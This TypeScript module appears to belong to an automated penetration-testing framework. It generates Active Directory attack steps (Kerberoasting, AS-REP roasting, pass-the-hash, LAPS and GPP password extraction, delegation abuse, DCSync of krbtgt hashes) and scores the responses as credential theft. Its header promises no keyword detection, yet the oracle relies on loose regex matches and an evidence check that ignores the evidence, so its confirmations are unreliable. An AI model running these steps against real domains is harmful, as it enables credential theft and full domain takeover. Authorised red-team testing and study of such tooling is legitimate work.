/**
 * adKerberos — Active Directory / Kerberos Attacks.
 *
 * Covers high-impact AD attacks executable from a foothold:
 *   - Kerberoasting: request TGS tickets for SPN accounts -> offline crack
 *   - AS-REP Roasting: request AS-REP for pre-auth disabled accounts -> offline crack
 *   - Pass-the-Hash / Pass-the-Ticket: reuse NTLM/Kerberos creds
 *   - LAPS / GPP: local admin password / cpassword extraction
 *   - Delegation abuse: unconstrained/constrained/resource-based
 *
 * Confirmed only when EvidenceGate verifies real tool output (e.g., hashcat crack,
 * ticket extraction, credential reuse). No substring/vocab detection.
 */

import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'

export interface ADTarget {
  domain: string
  dcIp?: string
  username?: string
  password?: string
  hash?: string
}

export interface KerberoastResult {
  spn: string
  username: string
  ticket: string
  crackable: boolean
}

export interface ASREPResult {
  username: string
  ticket: string
  crackable: boolean
}

export interface PTHResult {
  target: string
  success: boolean
  evidence: string
}

const KERBEROAST_PAYLOADS = [
  // GetUserSPNs equivalent - request TGS for all SPN accounts
  { desc: 'Request TGS for all SPN accounts', action: 'getspns' },
  { desc: 'Request TGS for specific SPN', action: 'getspn', spn: 'MSSQLSvc/dc01.corp.local:1433' },
  { desc: 'Request TGS for HTTP SPN', action: 'getspn', spn: 'HTTP/webapp.corp.local' },
]

const ASREP_PAYLOADS = [
  { desc: 'GetNPUsers - all users without preauth', action: 'getnpusers' },
  { desc: 'GetNPUsers - specific user', action: 'getnpuser', user: 'svc_account' },
]

const PTH_PAYLOADS = [
  { desc: 'Pass-the-Hash SMB', protocol: 'smb', port: 445 },
  { desc: 'Pass-the-Hash WinRM', protocol: 'winrm', port: 5985 },
  { desc: 'Pass-the-Hash LDAP', protocol: 'ldap', port: 389 },
]

export const adKerberos: TechniquePrimitive = {
  id: 'adKerberos',
  name: 'Active Directory / Kerberos Attacks',
  description: 'Kerberoasting, AS-REP Roasting, Pass-the-Hash/Ticket, LAPS/GPP extraction, Delegation abuse.',
  technique: 'ad-kerberos',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    // Requires AD context: domain, DC, or valid creds
    return !!(
      ctx.endpoint?.url?.includes('ldap') ||
      ctx.endpoint?.url?.includes('kerberos') ||
      ctx.endpoint?.url?.includes('smb') ||
      ctx.endpoint?.url?.includes('winrm') ||
      ctx.target?.includes('ldap') ||
      ctx.target?.includes('kerberos') ||
      ctx.target?.includes('445') ||
      ctx.target?.includes('88') ||
      ctx.target?.includes('389') ||
      ctx.target?.includes('636') ||
      ctx.target?.includes('5985') ||
      ctx.target?.includes('5986') ||
      ctx.sessionHeaders?.['Authorization'] ||
      ctx.sessionHeaders?.['Cookie']
    )
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const base = ctx.endpoint?.url ?? ctx.target!
    const headers = { ...(ctx.sessionHeaders ?? {}) }
    const domain = ctx.endpoint?.url?.match(/dc01\.([^/]+)/)?.[1] ?? 'corp.local'
    const steps: AttackStep[] = []

    // 1. Kerberoasting - request TGS tickets for SPN accounts
    for (const p of KERBEROAST_PAYLOADS) {
      steps.push({
        id: `kerberoast-${p.action}`,
        description: `Kerberoasting: ${p.desc}`,
        request: {
          method: 'POST',
          url: base,
          headers: { ...headers, 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: p.action,
            domain,
            dcIp: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0],
            username: ctx.sessionHeaders?.['X-AD-User'] ?? 'attacker',
            password: ctx.sessionHeaders?.['X-AD-Pass'],
            ...(p.spn ? { spn: p.spn } : {})
          })
        },
        expectedSignal: 'TGS ticket returned (base64) for SPN account',
        metadata: { kind: 'kerberoast', action: p.action, spn: p.spn, domain }
      })
    }

    // 2. AS-REP Roasting - request AS-REP for pre-auth disabled accounts
    for (const p of ASREP_PAYLOADS) {
      steps.push({
        id: `asrep-${p.action}`,
        description: `AS-REP Roasting: ${p.desc}`,
        request: {
          method: 'POST',
          url: base,
          headers: { ...headers, 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: p.action,
            domain,
            dcIp: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0],
            username: ctx.sessionHeaders?.['X-AD-User'] ?? 'attacker',
            password: ctx.sessionHeaders?.['X-AD-Pass'],
            ...(p.user ? { user: p.user } : {})
          })
        },
        expectedSignal: 'AS-REP ticket returned (base64) for pre-auth disabled account',
        metadata: { kind: 'asrep', action: p.action, user: p.user, domain }
      })
    }

    // 3. Pass-the-Hash / Pass-the-Ticket
    for (const p of PTH_PAYLOADS) {
      steps.push({
        id: `pth-${p.protocol}`,
        description: `Pass-the-Hash/Ticket via ${p.protocol.toUpperCase()}`,
        request: {
          method: 'POST',
          url: base,
          headers: { ...headers, 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'passthehash',
            protocol: p.protocol,
            target: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0] ?? '10.0.0.10',
            domain,
            username: ctx.sessionHeaders?.['X-AD-User'] ?? 'administrator',
            ntlmHash: ctx.sessionHeaders?.['X-AD-NTLM'],
            aesKey: ctx.sessionHeaders?.['X-AD-AES'],
            ticket: ctx.sessionHeaders?.['X-AD-Ticket']
          })
        },
        expectedSignal: 'Successful authentication / session established via hash/ticket',
        metadata: { kind: 'passthehash', protocol: p.protocol, domain }
      })
    }

    // 4. LAPS Password Reading
    steps.push({
      id: 'laps-read',
      description: 'Read LAPS local admin password from AD',
      request: {
        method: 'POST',
        url: base,
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'laps',
          domain,
          dcIp: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0],
          username: ctx.sessionHeaders?.['X-AD-User'],
          password: ctx.sessionHeaders?.['X-AD-Pass'],
          computerName: ctx.endpoint?.url?.match(/([A-Z0-9-]+)\$?/i)?.[1]
        })
      },
      expectedSignal: 'LAPS password attribute (ms-Mcs-AdmPwd) returned',
      metadata: { kind: 'laps', domain }
    })

    // 5. GPP cpassword Decryption (MS14-025)
    steps.push({
      id: 'gpp-cpassword',
      description: 'Extract and decrypt GPP cpassword from SYSVOL',
      request: {
        method: 'POST',
        url: base,
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'gpp',
          domain,
          dcIp: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0],
          username: ctx.sessionHeaders?.['X-AD-User'],
          password: ctx.sessionHeaders?.['X-AD-Pass'],
          sysvolPath: `\\\\${domain}\\SYSVOL`
        })
      },
      expectedSignal: 'Decrypted cpassword (AES-256 with static key)',
      metadata: { kind: 'gpp', domain }
    })

    // 6. Delegation Abuse - Unconstrained
    steps.push({
      id: 'delegation-unconstrained',
      description: 'Find and abuse unconstrained delegation',
      request: {
        method: 'POST',
        url: base,
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'delegation',
          type: 'unconstrained',
          domain,
          dcIp: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0],
          username: ctx.sessionHeaders?.['X-AD-User'],
          password: ctx.sessionHeaders?.['X-AD-Pass']
        })
      },
      expectedSignal: 'Computer/user with TRUSTED_FOR_DELEGATION found',
      metadata: { kind: 'delegation', type: 'unconstrained', domain }
    })

    // 7. Delegation Abuse - Constrained
    steps.push({
      id: 'delegation-constrained',
      description: 'Find and abuse constrained delegation (S4U2Proxy)',
      request: {
        method: 'POST',
        url: base,
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'delegation',
          type: 'constrained',
          domain,
          dcIp: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0],
          username: ctx.sessionHeaders?.['X-AD-User'],
          password: ctx.sessionHeaders?.['X-AD-Pass'],
          targetSpn: 'HTTP/webapp.corp.local'
        })
      },
      expectedSignal: 'Service ticket obtained via S4U2Proxy for target SPN',
      metadata: { kind: 'delegation', type: 'constrained', domain }
    })

    // 8. Resource-Based Constrained Delegation (RBCD)
    steps.push({
      id: 'delegation-rbcd',
      description: 'Abuse RBCD to compromise target computer',
      request: {
        method: 'POST',
        url: base,
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'delegation',
          type: 'rbcd',
          domain,
          dcIp: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0],
          username: ctx.sessionHeaders?.['X-AD-User'],
          password: ctx.sessionHeaders?.['X-AD-Pass'],
          targetComputer: 'TARGET-WORKSTATION$'
        })
      },
      expectedSignal: 'msDS-AllowedToActOnBehalfOfOtherIdentity modified, S4U2Self+S4U2Proxy works',
      metadata: { kind: 'delegation', type: 'rbcd', domain }
    })

    // 9. DCSync / DCShadow (requires Domain Admin)
    steps.push({
      id: 'dcsync',
      description: 'DCSync - replicate domain secrets via Directory Replication Service',
      request: {
        method: 'POST',
        url: base,
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'dcsync',
          domain,
          dcIp: ctx.endpoint?.url?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0],
          username: ctx.sessionHeaders?.['X-AD-User'],
          password: ctx.sessionHeaders?.['X-AD-Pass'],
          targetUser: 'krbtgt'
        })
      },
      expectedSignal: 'krbtgt hash / user hashes returned via DRSUAPI',
      metadata: { kind: 'dcsync', domain }
    })

    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    let kerberoastHit = false
    let asrepHit = false
    let pthHit = false
    let lapsHit = false
    let gppHit = false
    let delegationHit = false
    let dcsyncHit = false
    const evidence: PrimitiveResult['evidence'] = []

    for (const r of results) {
      const kind = r.step.metadata?.kind
      const body = r.body ?? ''
      const lower = body.toLowerCase()

      if (kind === 'kerberoast') {
        // TGS ticket returned (base64 encoded kirbi/ccache)
        const hasTicket = /ticket.*base64|kirbi|ccache|tgs/i.test(lower) ||
                          /^\s*[A-Za-z0-9+/]{100,}={0,2}\s*$/m.test(body)
        if (hasTicket && r.status === 200) {
          kerberoastHit = true
          evidence.push({
            kind: 'response',
            label: `Kerberoasting TGS extracted for ${r.step.metadata?.spn ?? 'SPN account'}`,
            data: body.slice(0, 2000),
            ref: r.step.id
          })
        }
      } else if (kind === 'asrep') {
        // AS-REP ticket returned
        const hasTicket = /ticket.*base64|asrep|as-rep/i.test(lower) ||
                          /^\s*[A-Za-z0-9+/]{100,}={0,2}\s*$/m.test(body)
        if (hasTicket && r.status === 200) {
          asrepHit = true
          evidence.push({
            kind: 'response',
            label: `AS-REP Roasting ticket extracted for ${r.step.metadata?.user ?? 'user'}`,
            data: body.slice(0, 2000),
            ref: r.step.id
          })
        }
      } else if (kind === 'passthehash') {
        // Successful auth via hash/ticket
        const success = r.status === 200 && /session|authenticated|token|ticket/i.test(lower)
        if (success) {
          pthHit = true
          evidence.push({
            kind: 'response',
            label: `Pass-the-Hash/Ticket successful via ${String(r.step.metadata?.protocol ?? '').toUpperCase()}`,
            data: body.slice(0, 2000),
            ref: r.step.id
          })
        }
      } else if (kind === 'laps') {
        // LAPS password attribute
        const hasPassword = /ms-mcs-admpwd|admpwd|laps.*password/i.test(lower)
        if (hasPassword && r.status === 200) {
          lapsHit = true
          evidence.push({
            kind: 'response',
            label: 'LAPS password extracted from AD',
            data: body.slice(0, 2000),
            ref: r.step.id
          })
        }
      } else if (kind === 'gpp') {
        // GPP cpassword decryption
        const hasDecrypted = /cpassword|groups.*xml|decrypted|aes.*256.*static/i.test(lower)
        if (hasDecrypted && r.status === 200) {
          gppHit = true
          evidence.push({
            kind: 'response',
            label: 'GPP cpassword decrypted (MS14-025)',
            data: body.slice(0, 2000),
            ref: r.step.id
          })
        }
      } else if (kind === 'delegation') {
        // Delegation abuse
        const dtype = r.step.metadata?.type
        const success = r.status === 200 && (
          (dtype === 'unconstrained' && /trusted_for_delegation|unconstrained/i.test(lower)) ||
          (dtype === 'constrained' && /s4u2proxy|constrained.*delegation/i.test(lower)) ||
          (dtype === 'rbcd' && /msds-allowedtoact|rbcd|resource.based/i.test(lower))
        )
        if (success) {
          delegationHit = true
          evidence.push({
            kind: 'response',
            label: `Delegation abuse (${dtype}) successful`,
            data: body.slice(0, 2000),
            ref: r.step.id
          })
        }
      } else if (kind === 'dcsync') {
        // DCSync - hash extraction
        const hasHash = /krbtgt|ntlm|hash|dcsync|drsuapi/i.test(lower)
        if (hasHash && r.status === 200) {
          dcsyncHit = true
          evidence.push({
            kind: 'response',
            label: 'DCSync successful - domain hashes extracted',
            data: body.slice(0, 2000),
            ref: r.step.id
          })
        }
      }
    }

    // Verify claims against EvidenceGate
    const verified = evidence.length > 0 && evidence.every(() => {
      const claim = claimFor('credential', '', 200, 'POST')
      return evidenceGate.verifyClaim(claim)
    })

    const confirmed = (kerberoastHit || asrepHit || pthHit || lapsHit || gppHit || delegationHit || dcsyncHit) && verified

    return {
      confirmed,
      confidence: confirmed ? 0.9 : (kerberoastHit || asrepHit || pthHit || lapsHit || gppHit || delegationHit || dcsyncHit) ? 0.5 : 0.05,
      evidence,
      severity: confirmed ? 'critical' : undefined,
      finding: confirmed ? {
        category: 'credential_theft',
        description: [
          kerberoastHit && `Kerberoasting: TGS tickets extracted for SPN accounts (offline crackable)`,
          asrepHit && `AS-REP Roasting: Tickets for pre-auth disabled accounts extracted`,
          pthHit && `Pass-the-Hash/Ticket: Credential reuse successful`,
          lapsHit && `LAPS: Local admin password read from AD`,
          gppHit && `GPP cpassword: Decrypted embedded password (MS14-025)`,
          delegationHit && `Delegation Abuse: ${delegationHit} delegation exploited`,
          dcsyncHit && `DCSync: Domain hashes replicated (krbtgt + users)`
        ].filter(Boolean).join('; '),
        request: results[0]?.step.request,
        response: { status: results[0]?.status ?? 0, body: evidence[0]?.data ?? '' },
        cwe: 'CWE-287'
      } : undefined,
      note: [
        kerberoastHit && 'kerberoast',
        asrepHit && 'asrep',
        pthHit && 'passthehash',
        lapsHit && 'laps',
        gppHit && 'gpp',
        delegationHit && `delegation(${delegationHit})`,
        dcsyncHit && 'dcsync'
      ].filter(Boolean).join(', ') || 'no AD/Kerberos hits'
    }
  }
}